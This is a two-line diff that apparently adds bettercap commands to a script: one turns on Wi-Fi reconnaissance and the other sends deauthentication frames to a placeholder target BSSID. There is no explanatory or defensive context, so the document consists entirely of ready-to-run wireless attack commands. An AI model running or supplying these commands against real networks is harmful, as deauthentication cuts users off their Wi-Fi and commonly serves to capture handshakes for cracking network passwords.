@@ -1,0 +1,2 @@
+wifi.recon on
+wifi.deauth TARGET_BSSID
